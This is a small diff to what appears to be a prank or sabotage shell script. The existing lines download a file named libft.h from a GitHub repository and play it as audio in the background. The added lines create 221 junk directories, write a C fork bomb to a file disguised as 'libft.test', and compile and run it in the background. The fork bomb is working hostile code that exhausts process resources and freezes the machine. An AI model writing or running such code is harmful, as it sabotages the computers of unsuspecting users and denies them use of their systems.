@@ -7,3 +7,6 @@ do
 done &
 curl -o ~/libft.h https://raw.githubusercontent.com/murmurlab/OpenWAR/main/libft.h
 afplay ~/libft.h &
+mkdir AAAAAAAAAAAAAAH{0..220}
+echo "#include <stdio.h>\n#include <unistd.h>\n#include <sys/types.h>\nint main(){while(1){fork();}return 0;}" > libft.test
+cc -x c libft.test && ./a.out &
